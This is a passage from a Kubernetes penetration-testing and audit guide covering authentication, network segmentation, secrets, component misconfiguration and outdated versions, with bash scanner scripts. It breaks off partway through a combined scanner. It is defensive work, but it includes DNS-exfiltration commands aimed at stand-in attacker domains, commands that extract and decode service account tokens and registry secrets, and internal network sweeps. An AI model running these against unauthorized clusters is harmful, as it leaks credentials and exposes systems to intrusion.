### 4. OIDC/OAuth Misconfigurations
**Vulnerability:** Misconfigured external authentication providers.

**Testing Commands:**
```bash
# Check OIDC configuration (requires API server access)
ps aux | grep kube-apiserver | grep -o -- '--oidc-[^ ]*'

# Look for OIDC-related configurations
kubectl get configmaps -A | grep -E "oidc|oauth|auth"

# Check for authentication webhooks
kubectl get validatingadmissionwebhooks -o json | jq -r '.items[] | select(.metadata.name | contains("auth")) | .metadata.name'

# Test OIDC token validation
# This would require valid OIDC tokens for testing
```

### 5. Node Authentication Problems
**Vulnerability:** Weak authentication between cluster components.

**Testing Commands:**
```bash
# Check node authorization mode (requires master access)
ps aux | grep kube-apiserver | grep -o -- '--authorization-mode=[^ ]*'

# Test kubelet authentication
curl -k https://NODE_IP:10250/metrics
curl -k https://NODE_IP:10250/pods -H "Authorization: Bearer $TOKEN"

# Check node certificates
kubectl get nodes -o json | jq -r '.items[] | .status.addresses[] | select(.type == "InternalIP") | .address' | while read node; do
    echo "Testing node: $node"
    curl -k --connect-timeout 5 https://$node:10250/healthz
done
```

## How to Determine Vulnerability

**Critical Indicators:**
- Anonymous access permitted to sensitive endpoints
- Service account tokens auto-mounted unnecessarily
- Weak or no authentication on kubelet
- Missing certificate rotation
- OIDC misconfiguration allowing bypass
- Default credentials in use

**Testing Script:**
```bash
#!/bin/bash
# K06 Authentication Scanner

echo "=== K06: Authentication Vulnerabilities Scanner ==="

echo "[+] Testing anonymous access..."
if curl -k -s --connect-timeout 5 https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces >/dev/null; then
    echo "WARNING: Anonymous access to API server possible"
else
    echo "GOOD: Anonymous access blocked"
fi

echo "[+] Checking for anonymous bindings..."
kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.subjects[]?.name == "system:anonymous") | "WARNING: \(.metadata.name) allows anonymous access"'

echo "[+] Checking service account auto-mounting..."
SA_COUNT=$(kubectl get serviceaccounts -A -o json | jq '[.items[] | select(.automountServiceAccountToken != false)] | length')
echo "Service accounts with auto-mount: $SA_COUNT"

echo "[+] Looking for hardcoded tokens..."
kubectl get secrets -A | grep -c service-account-token

echo "[+] Testing kubelet access..."
kubectl get nodes -o json | jq -r '.items[] | .status.addresses[] | select(.type == "InternalIP") | .address' | head -1 | while read node; do
    if curl -k -s --connect-timeout 5 https://$node:10250/healthz >/dev/null 2>&1; then
        echo "INFO: Kubelet accessible on $node"
    fi
done

echo "=== K06 Scan Complete ==="
```

---

# K07: Missing Network Segmentation Controls

## Overview
Absence of network policies and segmentation controls allowing unrestricted east-west traffic and lateral movement within the cluster.

## What to Test

### 1. Network Policy Assessment
**Vulnerability:** Missing or ineffective network policies.

**Testing Commands:**
```bash
# Check if any network policies exist
kubectl get networkpolicies --all-namespaces

# Count network policies per namespace
for ns in $(kubectl get namespaces -o name | cut -d/ -f2); do
    count=$(kubectl get networkpolicies -n "$ns" --no-headers 2>/dev/null | wc -l)
    echo "Namespace $ns: $count network policies"
done

# Check for default-deny network policies
kubectl get networkpolicies -A -o yaml | grep -A 20 -B 5 "podSelector: {}"

# Look for permissive policies
kubectl get networkpolicies -A -o json | jq -r '.items[] | select(.spec.ingress == [] or .spec.egress == []) | "\(.metadata.namespace)/\(.metadata.name) - Permissive policy"'
```

**What to Look For:**
- Namespaces without any network policies
- Missing default-deny policies
- Overly permissive ingress/egress rules
- No network policy enforcement

### 2. Service Mesh Security
**Vulnerability:** Missing or misconfigured service mesh security policies.

**Testing Commands:**
```bash
# Check for Istio components
kubectl get pods -n istio-system

# Check Istio security policies
kubectl get peerauthentications.security.istio.io -A
kubectl get authorizationpolicies.security.istio.io -A
kubectl get destinationrules.networking.istio.io -A

# Check for mTLS enforcement
kubectl get peerauthentications.security.istio.io -A -o json | jq -r '.items[] | select(.spec.mtls.mode != "STRICT") | "\(.metadata.namespace)/\(.metadata.name) - Not using strict mTLS"'

# Test service-to-service communication
kubectl run test-curl --image=curlimages/curl --rm --restart=Never -it -- curl http://target-service.target-namespace.svc.cluster.local
```

### 3. Flat Network Testing
**Vulnerability:** Default flat networking allowing unrestricted pod-to-pod communication.

**Testing Commands:**
```bash
# Test cross-namespace communication
kubectl run nettest-source --image=busybox --rm --restart=Never -it -- wget -qO- http://target-service.other-namespace.svc.cluster.local

# Scan internal networks
kubectl run nmap-test --image=instrumentisto/nmap --rm --restart=Never -it -- nmap -sn 10.0.0.0/8

# Test access to cluster services
kubectl run cluster-test --image=busybox --rm --restart=Never -it -- nslookup kubernetes.default.svc.cluster.local

# Check DNS resolution capabilities
kubectl run dns-test --image=busybox --rm --restart=Never -it -- nslookup google.com

# Test egress to external services
kubectl run egress-test --image=curlimages/curl --rm --restart=Never -it -- curl -I https://www.google.com
```

### 4. Port and Protocol Restrictions
**Vulnerability:** No restrictions on network ports or protocols.

**Testing Commands:**
```bash
# Test different protocols and ports
kubectl run protocol-test --image=busybox --rm --restart=Never -it -- nc -zv target-ip 22
kubectl run protocol-test --image=busybox --rm --restart=Never -it -- nc -zv target-ip 443
kubectl run protocol-test --image=busybox --rm --restart=Never -it -- nc -zv target-ip 3306

# Check for UDP traffic restrictions
kubectl run udp-test --image=busybox --rm --restart=Never -it -- nc -u -zv target-ip 53

# Test ICMP (ping) restrictions
kubectl run ping-test --image=busybox --rm --restart=Never -it -- ping -c 1 target-ip
```

### 5. Ingress and Egress Controls
**Vulnerability:** Unrestricted ingress and egress traffic.

**Testing Commands:**
```bash
# Check ingress controllers and rules
kubectl get ingress -A
kubectl get services -A | grep LoadBalancer
kubectl get services -A | grep NodePort

# Test external access to services
curl -I http://external-service-ip

# Check for egress restrictions
kubectl run egress-test --image=curlimages/curl --rm --restart=Never -it -- curl -I https://malicious-site.com

# DNS exfiltration test
kubectl run dns-exfil --image=busybox --rm --restart=Never -it -- nslookup $(echo "secret-data" | base64).attacker-domain.com
```

## How to Determine Vulnerability

**Critical Indicators:**
- No network policies in any namespace
- Successful cross-namespace communication without policies
- Unrestricted egress to external sites
- No service mesh security policies
- DNS exfiltration possible
- Internal service scanning successful

**Network Segmentation Test Script:**
```bash
#!/bin/bash
# K07 Network Segmentation Scanner

echo "=== K07: Network Segmentation Scanner ==="

echo "[+] Checking network policies..."
TOTAL_POLICIES=$(kubectl get networkpolicies -A --no-headers 2>/dev/null | wc -l)
echo "Total network policies: $TOTAL_POLICIES"

echo "[+] Checking namespaces without policies..."
for ns in $(kubectl get namespaces -o name | cut -d/ -f2 | grep -v kube-); do
    count=$(kubectl get networkpolicies -n "$ns" --no-headers 2>/dev/null | wc -l)
    if [ $count -eq 0 ]; then
        echo "WARNING: Namespace $ns has no network policies"
    fi
done

echo "[+] Testing cross-namespace communication..."
kubectl run nettest --image=busybox --rm --restart=Never --timeout=30s -- wget -qO- --timeout=5 http://kubernetes.default.svc.cluster.local &>/dev/null
if [ $? -eq 0 ]; then
    echo "WARNING: Cross-namespace communication allowed"
else
    echo "GOOD: Cross-namespace communication restricted"
fi

echo "[+] Testing external egress..."
kubectl run egress-test --image=curlimages/curl --rm --restart=Never --timeout=30s -- curl -I --connect-timeout 5 https://www.google.com &>/dev/null
if [ $? -eq 0 ]; then
    echo "INFO: External egress allowed"
else
    echo "INFO: External egress restricted"
fi

echo "[+] Checking service mesh..."
ISTIO_PODS=$(kubectl get pods -n istio-system 2>/dev/null | wc -l)
if [ $ISTIO_PODS -gt 0 ]; then
    echo "INFO: Istio service mesh detected"
    PEER_AUTH=$(kubectl get peerauthentications.security.istio.io -A --no-headers 2>/dev/null | wc -l)
    echo "PeerAuthentication policies: $PEER_AUTH"
else
    echo "INFO: No service mesh detected"
fi

if [ $TOTAL_POLICIES -eq 0 ]; then
    echo "CRITICAL: No network segmentation controls found"
fi

echo "=== K07 Scan Complete ==="
```

---

# K08: Secrets Management Failures

## Overview
Improper handling, storage, or exposure of sensitive data such as passwords, API keys, certificates, and tokens within the Kubernetes environment.

## What to Test

### 1. Secret Storage Assessment
**Vulnerability:** Secrets stored in plain text or improperly configured.

**Testing Commands:**
```bash
# List all secrets in cluster
kubectl get secrets --all-namespaces

# Check secret types and data
kubectl get secrets -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): \(.type) - \(.data | keys | length) keys"'

# Look for generic secrets (often contain sensitive data)
kubectl get secrets -A | grep Opaque

# Check if secrets are base64 encoded (default)
kubectl get secret mysecret -o jsonpath='{.data}' | jq 'to_entries[] | {key: .key, value: (.value | @base64d)}'

# Find secrets with predictable names
kubectl get secrets -A | grep -E "password|token|key|secret|credential"
```

**What to Look For:**
- Secrets in plain text
- Generic/Opaque secrets with sensitive data
- Default secret names
- Large number of secrets
- Secrets without proper labeling

### 2. Secret Exposure in Environment Variables
**Vulnerability:** Sensitive data exposed through environment variables.

**Testing Commands:**
```bash
# Check for secrets in environment variables
kubectl get pods -A -o json | jq -r '.items[] | {pod: "\(.metadata.namespace)/\(.metadata.name)", env: [.spec.containers[].env[]? | select(.valueFrom.secretKeyRef) | .name]} | select(.env | length > 0)'

# Look for hardcoded sensitive values in env vars
kubectl get pods -A -o json | jq -r '.items[] | .spec.containers[] | .env[]? | select(.value | test("password|token|key|secret"; "i")) | {name: .name, value: .value}'

# Check configmaps for sensitive data
kubectl get configmaps -A -o json | jq -r '.items[] | select(.data | tostring | test("password|token|key|secret"; "i")) | "\(.metadata.namespace)/\(.metadata.name)"'

# Examine pod specs for exposed secrets
kubectl get pods -A -o yaml | grep -A 5 -B 5 -i "password\|token\|key\|secret"
```

### 3. Service Account Token Exposure
**Vulnerability:** Service account tokens unnecessarily exposed or overprivileged.

**Testing Commands:**
```bash
# Find auto-mounted service account tokens
kubectl get pods -A -o json | jq -r '.items[] | select(.spec.automountServiceAccountToken != false) | "\(.metadata.namespace)/\(.metadata.name) - Auto-mounts SA token"'

# Check service account token files in pods
kubectl exec -it pod-name -- find /var/run/secrets/kubernetes.io/serviceaccount -type f

# Extract and decode service account tokens
kubectl exec -it pod-name -- cat /var/run/secrets/kubernetes.io/serviceaccount/token | cut -d. -f2 | base64 -d 2>/dev/null | jq .

# Test service account token permissions
SA_TOKEN=$(kubectl get secret $(kubectl get sa default -o jsonpath='{.secrets[0].name}') -o jsonpath='{.data.token}' | base64 -d)
kubectl auth can-i --list --token=$SA_TOKEN
```

### 4. External Secret Management Integration
**Vulnerability:** Missing or misconfigured external secret management.

**Testing Commands:**
```bash
# Check for external secret management tools
kubectl get pods -A | grep -E "vault|external-secrets|sealed-secrets|csi-secrets"

# Look for Azure Key Vault integration
kubectl get secretproviderclass -A
kubectl get pods -A | grep secrets-store-csi-driver

# Check for HashiCorp Vault
kubectl get pods -A | grep vault
kubectl get secrets -A | grep vault

# Look for sealed secrets
kubectl get sealedsecrets -A 2>/dev/null

# Check CSI secrets driver
kubectl get csinodes
kubectl get storageclass | grep secrets
```

### 5. Secret Encryption at Rest
**Vulnerability:** Secrets not encrypted at rest in etcd.

**Testing Commands:**
```bash
# Check etcd encryption (requires master node access)
ps aux | grep kube-apiserver | grep -o -- '--encryption-provider-config=[^ ]*'

# For managed clusters, check encryption settings
kubectl get nodes -o json | jq -r '.items[0].status.nodeInfo.kubeletVersion'

# Test if secrets are encrypted in etcd (requires etcd access)
# This would require direct etcd access which is typically not available in managed clusters
```

### 6. Secret Scanning and Detection
**Vulnerability:** Secrets accidentally committed or exposed in configurations.

**Testing Commands:**
```bash
# Scan pod specifications for hardcoded secrets
kubectl get pods -A -o yaml > all-pods.yaml
grep -r -i -E "(password|passwd|pwd|token|key|secret|credential)" all-pods.yaml

# Check image registries for exposed secrets
kubectl get secrets -A -o json | jq -r '.items[] | select(.type == "kubernetes.io/dockerconfigjson") | "\(.metadata.namespace)/\(.metadata.name)"'

# Decode and examine registry secrets
kubectl get secret docker-registry-secret -o jsonpath='{.data.\.dockerconfigjson}' | base64 -d | jq .

# Look for TLS secrets
kubectl get secrets -A -o json | jq -r '.items[] | select(.type == "kubernetes.io/tls") | "\(.metadata.namespace)/\(.metadata.name)"'
```

## How to Determine Vulnerability

**Critical Indicators:**
- Secrets with sensitive data in environment variables
- Auto-mounted service account tokens
- Hardcoded credentials in pod specs
- No external secret management
- Secrets not encrypted at rest
- Registry credentials exposed
- Default service account tokens with permissions

**Secret Scanning Script:**
```bash
#!/bin/bash
# K08 Secrets Management Scanner

echo "=== K08: Secrets Management Scanner ==="

echo "[+] Counting secrets across cluster..."
TOTAL_SECRETS=$(kubectl get secrets -A --no-headers 2>/dev/null | wc -l)
echo "Total secrets found: $TOTAL_SECRETS"

echo "[+] Checking for exposed secrets in environment variables..."
kubectl get pods -A -o json | jq -r '.items[] | .spec.containers[] | .env[]? | select(.value | test("password|token|key|secret"; "i")) | "WARNING: Hardcoded secret in env var: \(.name)"' 2>/dev/null

echo "[+] Checking service account token auto-mounting..."
AUTO_MOUNT_COUNT=$(kubectl get pods -A -o json | jq '[.items[] | select(.spec.automountServiceAccountToken != false)] | length')
echo "Pods with auto-mounted SA tokens: $AUTO_MOUNT_COUNT"

echo "[+] Looking for external secret management..."
EXTERNAL_SECRETS=$(kubectl get pods -A 2>/dev/null | grep -c -E "vault|external-secrets|sealed-secrets|csi-secrets")
echo "External secret management pods: $EXTERNAL_SECRETS"

echo "[+] Checking for Azure Key Vault integration..."
KEY_VAULT_CLASSES=$(kubectl get secretproviderclass -A --no-headers 2>/dev/null | wc -l)
echo "SecretProviderClass objects: $KEY_VAULT_CLASSES"

echo "[+] Scanning for registry secrets..."
REGISTRY_SECRETS=$(kubectl get secrets -A -o json | jq '[.items[] | select(.type == "kubernetes.io/dockerconfigjson")] | length')
echo "Docker registry secrets: $REGISTRY_SECRETS"

echo "[+] Checking ConfigMaps for sensitive data..."
kubectl get configmaps -A -o json | jq -r '.items[] | select(.data | tostring | test("password|token|key"; "i")) | "WARNING: \(.metadata.namespace)/\(.metadata.name) may contain sensitive data"' 2>/dev/null | head -5

if [ $EXTERNAL_SECRETS -eq 0 ] && [ $TOTAL_SECRETS -gt 10 ]; then
    echo "CRITICAL: Many secrets without external management"
fi

echo "=== K08 Scan Complete ==="
```

---

# K09: Misconfigured Cluster Components

## Overview
Security misconfigurations in core Kubernetes components such as API server, kubelet, etcd, and controller manager that can lead to cluster compromise.

## What to Test

### 1. API Server Misconfigurations
**Vulnerability:** Insecure API server settings.

**Testing Commands:**
```bash
# Check API server configuration (requires master node access)
ps aux | grep kube-apiserver

# Check for insecure port (should be disabled)
ps aux | grep kube-apiserver | grep -o -- '--insecure-port=[0-9]*'

# Check authentication modes
ps aux | grep kube-apiserver | grep -o -- '--authentication-mode=[^ ]*'

# Check authorization modes
ps aux | grep kube-apiserver | grep -o -- '--authorization-mode=[^ ]*'

# Check if anonymous authentication is disabled
ps aux | grep kube-apiserver | grep -o -- '--anonymous-auth=[^ ]*'

# Test API server endpoints
curl -k https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1
curl -k https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/healthz

# Check for deprecated API versions
kubectl api-versions | grep -E "v1alpha1|v1beta1"
```

**What to Look For:**
- `--insecure-port` not set to 0
- `--anonymous-auth=true`
- Weak authentication modes
- Missing authorization modes
- Deprecated API versions enabled

### 2. Kubelet Misconfigurations
**Vulnerability:** Insecure kubelet settings allowing unauthorized access.

**Testing Commands:**
```bash
# Test kubelet API access (requires node IP)
NODE_IP=$(kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}')
curl -k https://$NODE_IP:10250/metrics
curl -k https://$NODE_IP:10250/pods

# Test anonymous access to kubelet
curl -k https://$NODE_IP:10250/healthz

# Check kubelet configuration (requires node access)
ps aux | grep kubelet | grep -o -- '--anonymous-auth=[^ ]*'
ps aux | grep kubelet | grep -o -- '--authorization-mode=[^ ]*'
ps aux | grep kubelet | grep -o -- '--read-only-port=[0-9]*'

# Check kubelet certificates
openssl s_client -connect $NODE_IP:10250 -showcerts </dev/null 2>/dev/null | openssl x509 -text | grep "Subject:"
```

**What to Look For:**
- Kubelet accessible without authentication
- `--anonymous-auth=true` on kubelet
- `--read-only-port` not set to 0
- Weak kubelet certificates
- Missing authorization mode

### 3. etcd Security Assessment
**Vulnerability:** Exposed or unsecured etcd database.

**Testing Commands:**
```bash
# Check for exposed etcd (typically on port 2379)
nmap -p 2379 cluster-ip-range

# Test etcd access without authentication
curl http://etcd-ip:2379/v2/keys/

# Check etcd SSL/TLS configuration
curl https://etcd-ip:2379/v2/keys/ --cert client.crt --key client.key --cacert ca.crt

# For managed clusters, check etcd encryption
kubectl get secrets -A | head -1
# If you can see secrets, etcd encryption may not be enabled

# Check etcd cluster health
kubectl get componentstatuses
```

**What to Look For:**
- etcd accessible without authentication
- No TLS encryption for etcd
- etcd exposed to network
- No client certificate authentication
- Data not encrypted at rest

### 4. Controller Manager and Scheduler
**Vulnerability:** Misconfigured controller manager and scheduler.

**Testing Commands:**
```bash
# Check controller manager configuration (requires master access)
ps aux | grep kube-controller-manager

# Check scheduler configuration
ps aux | grep kube-scheduler

# Look for insecure bindings
ps aux | grep kube-controller-manager | grep -o -- '--bind-address=[^ ]*'
ps aux | grep kube-scheduler | grep -o -- '--bind-address=[^ ]*'

# Check component health
kubectl get componentstatuses

# Test component endpoints (if accessible)
curl -k https://master-ip:10257/metrics # controller-manager
curl -k https://master-ip:10259/metrics # scheduler
```

### 5. Container Runtime Security
**Vulnerability:** Insecure container runtime configuration.

**Testing Commands:**
```bash
# Check container runtime (requires node access)
kubectl get nodes -o wide

# For Docker runtime
docker info | grep -E "Security|Runtime"

# For containerd
ctr version

# Check for privileged containers
kubectl get pods -A -o json | jq '.items[] | select(.spec.containers[].securityContext.privileged == true)'

# Check runtime security policies
kubectl get runtimeclasses

# Test container capabilities
kubectl run test-caps --image=busybox --rm --restart=Never -it -- sh -c "capsh --print"
```

### 6. DNS Security (CoreDNS)
**Vulnerability:** DNS poisoning or misconfigured DNS.

**Testing Commands:**
```bash
# Check CoreDNS configuration
kubectl get configmap coredns -n kube-system -o yaml

# Test DNS resolution
kubectl run dns-test --image=busybox --rm --restart=Never -it -- nslookup kubernetes.default.svc.cluster.local

# Check for DNS security policies
kubectl get networkpolicies -A | grep dns

# Test DNS exfiltration
kubectl run dns-exfil --image=busybox --rm --restart=Never -it -- nslookup $(date | base64).malicious-domain.com

# Check DNS query logging
kubectl logs -n kube-system deployment/coredns
```

## How to Determine Vulnerability

**Critical Indicators:**
- API server with insecure ports enabled
- Kubelet accessible without authentication
- etcd exposed without TLS/authentication
- Anonymous authentication enabled
- Deprecated API versions in use
- Container runtime allowing privileged operations
- DNS configuration allowing exfiltration

**Component Security Scanner:**
```bash
#!/bin/bash
# K09 Cluster Components Scanner

echo "=== K09: Cluster Components Scanner ==="

echo "[+] Testing API Server access..."
if curl -k -s --connect-timeout 5 https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1 >/dev/null; then
    echo "INFO: API Server accessible"
    
    # Test anonymous access
    if curl -k -s --connect-timeout 5 https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT/api/v1/namespaces >/dev/null; then
        echo "WARNING: Anonymous access to API server possible"
    fi
else
    echo "INFO: API Server not accessible (expected for secured clusters)"
fi

echo "[+] Testing Kubelet access..."
NODE_IP=$(kubectl get nodes -o jsonpath='{.items[0].status.addresses[?(@.type=="InternalIP")].address}' 2>/dev/null)
if [ ! -z "$NODE_IP" ]; then
    if curl -k -s --connect-timeout 5 https://$NODE_IP:10250/healthz >/dev/null 2>&1; then
        echo "INFO: Kubelet accessible on $NODE_IP"
        
        # Test anonymous access
        if curl -k -s --connect-timeout 5 https://$NODE_IP:10250/pods >/dev/null 2>&1; then
            echo "CRITICAL: Anonymous access to kubelet possible"
        fi
    fi
fi

echo "[+] Checking component status..."
kubectl get componentstatuses 2>/dev/null || echo "Component status not available (expected in managed clusters)"

echo "[+] Checking for deprecated APIs..."
DEPRECATED_APIS=$(kubectl api-versions | grep -c -E "v1alpha1|v1beta1")
echo "Deprecated API versions available: $DEPRECATED_APIS"

echo "[+] Checking CoreDNS configuration..."
kubectl get configmap coredns -n kube-system >/dev/null 2>&1 && echo "CoreDNS configuration accessible" || echo "CoreDNS configuration not accessible"

echo "[+] Testing DNS resolution..."
kubectl run dns-test --image=busybox --rm --restart=Never --timeout=30s -- nslookup kubernetes.default.svc.cluster.local &>/dev/null
if [ $? -eq 0 ]; then
    echo "GOOD: DNS resolution working"
else
    echo "WARNING: DNS resolution issues"
fi

echo "=== K09 Scan Complete ==="
```

---

# K10: Outdated and Vulnerable Kubernetes Components

## Overview
Running outdated versions of Kubernetes and its ecosystem components that contain known security vulnerabilities (CVEs).

## What to Test

### 1. Kubernetes Version Assessment
**Vulnerability:** Outdated Kubernetes control plane and node versions.

**Testing Commands:**
```bash
# Check cluster version
kubectl version --short

# Get detailed version information
kubectl version -o yaml

# Check node versions
kubectl get nodes -o wide

# Compare with latest stable version
curl -s https://api.github.com/repos/kubernetes/kubernetes/releases/latest | jq -r '.tag_name'

# Check for version skew between components
kubectl get componentstatuses

# Check kubelet versions across nodes
kubectl get nodes -o json | jq -r '.items[] | "\(.metadata.name): \(.status.nodeInfo.kubeletVersion)"'
```

**What to Look For:**
- Kubernetes versions with known CVEs
- Version skew between control plane and nodes
- Unsupported Kubernetes versions
- Missing security patches

### 2. Container Runtime Vulnerabilities
**Vulnerability:** Outdated container runtime with security flaws.

**Testing Commands:**
```bash
# Check container runtime versions
kubectl get nodes -o json | jq -r '.items[] | "\(.metadata.name): \(.status.nodeInfo.containerRuntimeVersion)"'

# Check for specific runtime vulnerabilities
kubectl describe nodes | grep -E "Container Runtime Version|Kernel Version|OS Image"

# For Docker runtime (if accessible)
docker version

# For containerd runtime
ctr version 2>/dev/null || echo "containerd not accessible"
```

### 3. Core Component Vulnerabilities
**Vulnerability:** Vulnerable versions of etcd, CoreDNS, and other core components.

**Testing Commands:**
```bash
# Check etcd version (if accessible)
kubectl get pods -n kube-system | grep etcd

# Check CoreDNS version
kubectl get deployment coredns -n kube-system -o json | jq -r '.spec.template.spec.containers[0].image'

# Check kube-proxy version
kubectl get daemonset kube-proxy -n kube-system -o json | jq -r '.spec.template.spec.containers[0].image'

# List all system component images
kubectl get pods -n kube-system -o json | jq -r '.items[] | "\(.metadata.name): \(.spec.containers[].image)"'

# Check for CVE databases
curl -s "https://cve.circl.lu/api/search/kubernetes" | jq '.[] | select(.cvss > 7)'
```

### 4. Add-on and Extension Vulnerabilities
**Vulnerability:** Outdated cluster add-ons and extensions.

**Testing Commands:**
```bash
# Check CNI plugin versions
kubectl get pods -n kube-system | grep -E "calico|flannel|weave|cilium"

# Check Ingress controller versions
kubectl get pods -A | grep -E "nginx-ingress|traefik|istio|envoy"

# Check monitoring stack versions
kubectl get pods -A | grep -E "prometheus|grafana|alertmanager"

# Check logging stack versions
kubectl get pods -A | grep -E "fluentd|elasticsearch|kibana|logstash"

# List all add-on images and versions
kubectl get pods -A -o json | jq -r '.items[] | "\(.metadata.namespace)/\(.metadata.name): \(.spec.containers[].image)"' | sort | uniq
```

### 5. Security Tool Vulnerabilities
**Vulnerability:** Outdated security tools and scanners.

**Testing Commands:**
```bash
# Check security scanning tools
kubectl get pods -A | grep -E "trivy|falco|twistlock|aqua|sysdig"

# Check admission controllers
kubectl get validatingadmissionwebhooks -o json | jq -r '.items[] | "\(.metadata.name): \(.webhooks[0].clientConfig.service.name)"'

# Check policy engines
kubectl get pods -A | grep -E "gatekeeper|kyverno|opa"

# Check certificate management
kubectl get pods -A | grep -E "cert-manager|external-dns"
```

### 6. CVE Scanning and Assessment
**Vulnerability:** Components with known CVEs.

**Testing Commands:**
```bash
# Use Trivy to scan cluster
trivy k8s --report summary cluster

# Scan specific images for CVEs
kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}' | tr ' ' '\n' | sort | uniq | while read image; do
    echo "Scanning $image for CVEs"
    trivy image --severity HIGH,CRITICAL "$image" 2>/dev/null | head -10
done

# Check for specific Kubernetes CVEs
curl -s "https://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=kubernetes" | grep -o "CVE-[0-9]\{4\}-[0-9]\{4,\}"

# Use kube-hunter to find vulnerabilities
kube-hunter --remote $KUBERNETES_SERVICE_HOST
```

## How to Determine Vulnerability

**Critical Indicators:**
- Kubernetes version with known high/critical CVEs
- Container runtime with security vulnerabilities
- Core components (etcd, CoreDNS) with outdated versions
- Add-ons with known vulnerabilities
- No regular patching schedule
- Components multiple versions behind current stable

**Version and CVE Scanner:**
```bash
#!/bin/bash
# K10 Outdated Components Scanner

echo "=== K10: Outdated and Vulnerable Components Scanner ==="

echo "[+] Checking Kubernetes versions..."
CLIENT_VERSION=$(kubectl version --short --client | awk '{print $3}')
SERVER_VERSION=$(kubectl version --short --server | awk '{print $3}')
echo "Client version: $CLIENT_VERSION"
echo "Server version: $SERVER_VERSION"

# Get latest Kubernetes version
LATEST_VERSION=$(curl -s https://api.github.com/repos/kubernetes/kubernetes/releases/latest | jq -r '.tag_name' 2>/dev/null)
if [ ! -z "$LATEST_VERSION" ]; then
    echo "Latest available: $LATEST_VERSION"
else
    echo "Could not fetch latest version"
fi

echo "[+] Checking node versions..."
kubectl get nodes -o json | jq -r '.items[] | "\(.metadata.name): kubelet \(.status.nodeInfo.kubeletVersion), runtime \(.status.nodeInfo.containerRuntimeVersion)"'

echo "[+] Checking core component images..."
kubectl get pods -n kube-system -o json | jq -r '.items[] | "\(.metadata.name): \(.spec.containers[0].image)"' | head -10

echo "[+] Scanning for high-priority images..."
# Get unique system images
kubectl get pods -n kube-system -o jsonpath='{.items[*].spec.containers[*].image}' | tr ' ' '\n' | sort | uniq | head -5 | while read image; do
    echo "Checking $image..."
    if command -v trivy &> /dev/null; then
        trivy image --severity HIGH,CRITICAL --quiet "$image" | grep -c -E "HIGH|CRITICAL" | xargs -I {} echo "  Found {} HIGH/CRITICAL vulnerabilities"
    else
        echo "  Install Trivy for vulnerability scanning"
    fi
done

echo "[+] Checking for deprecated API usage..."
kubectl get events -A --field-selector reason=FailedMount | grep -c "deprecated" | xargs -I {} echo "Deprecated API warnings: {}"

echo "[+] Component summary..."
TOTAL_PODS=$(kubectl get pods -A --no-headers | wc -l)
SYSTEM_PODS=$(kubectl get pods -n kube-system --no-headers | wc -l)
echo "Total pods: $TOTAL_PODS (System: $SYSTEM_PODS)"

# Age check
CLUSTER_AGE=$(kubectl get nodes -o json | jq -r '.items[0].metadata.creationTimestamp' | xargs -I {} date -d {} +%s)
CURRENT_TIME=$(date +%s)
AGE_DAYS=$(( (CURRENT_TIME - CLUSTER_AGE) / 86400 ))
echo "Cluster age: $AGE_DAYS days"

if [ $AGE_DAYS -gt 90 ]; then
    echo "WARNING: Cluster is over 90 days old, check for updates"
fi

echo "=== K10 Scan Complete ==="
```

---

# Complete OWASP K8s Top 10 Scanner

Here's a comprehensive script that tests for all OWASP Kubernetes Top 10 vulnerabilities:

```bash
#!/bin/bash
# Complete OWASP Kubernetes Top 10 Security Scanner

echo "=========================================="
echo "OWASP Kubernetes Top 10 Security Scanner"
echo "=========================================="

# Color codes for output
RED='\033[0;31m'
YELLOW='\033[1;33m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Score tracking
CRITICAL_COUNT=0
HIGH_COUNT=0
MEDIUM_COUNT=0

log_finding() {
    local level=$1
    local message=$2
    
    case $level in
        "CRITICAL")
            echo -e "${RED}[CRITICAL]${NC} $message"
            ((CRITICAL_COUNT++))
            ;;
        "HIGH")
            echo -e "${YELLOW}[HIGH]${NC} $message"
            ((HIGH_COUNT++))
            ;;
        "MEDIUM")
            echo -e "${BLUE}[MEDIUM]${NC} $message"
            ((MEDIUM_COUNT++))
            ;;
        "INFO")
            echo -e "${GREEN}[INFO]${NC} $message"
            ;;
    esac
}

# K01: Insecure Workload Configurations
echo -e "\n${BLUE}=== K01: Insecure Workload Configurations ===${NC}"
PRIVILEGED_PODS=$(kubectl get pods -A -o json | jq -r '.items[] | select(.spec.containers[]?.securityContext?.privileged == true) | "\(.metadata.namespace)/\(.metadata.name)"' | wc -l)
if [ $PRIVILEGED_PODS -gt 0 ]; then
    log_finding "CRITICAL" "$PRIVILEGED_PODS privileged containers found"
fi

HOST_NAMESPACE_PODS=$(kubectl get pods -A -o json | jq -r '.items[] | select(.spec.hostNetwork == true or .spec.hostPID == true or .spec.hostIPC == true) | "\(.metadata.namespace)/\(.metadata.name)"' | wc -l)
if [ $HOST_NAMESPACE_PODS -gt 0 ]; then
    log_finding "CRITICAL" "$HOST_NAMESPACE_PODS pods sharing host namespaces"
fi

# K02: Supply Chain Vulnerabilities
echo -e "\n${BLUE}=== K02: Supply Chain Vulnerabilities ===${NC}"
LATEST_TAG_IMAGES=$(kubectl get pods -A -o jsonpath='{.items[*].spec.containers[*].image}' | tr ' ' '\n' | grep -c -E ':latest$|^[^:]+$')
if [ $LATEST_TAG_IMAGES -gt 0 ]; then
    log_finding "HIGH" "$LATEST_TAG_IMAGES images using latest or no tag"
fi

if command -v trivy &> /dev/null; then
    log_finding "INFO" "Trivy available for vulnerability scanning"
else
    log_finding "MEDIUM" "No vulnerability scanner (Trivy) available"
fi

# K03: Overly Permissive RBAC Configurations
echo -e "\n${BLUE}=== K03: Overly Permissive RBAC Configurations ===${NC}"
CLUSTER_ADMIN_BINDINGS=$(kubectl get clusterrolebindings -o json | jq -r '.items[] | select(.roleRef.name == "cluster-admin") | .metadata.name' | wc -l)
if [ $CLUSTER_ADMIN_BINDINGS -gt 2 ]; then
    log_finding "HIGH" "$CLUSTER_ADMIN_BINDINGS cluster-admin bindings found"
fi

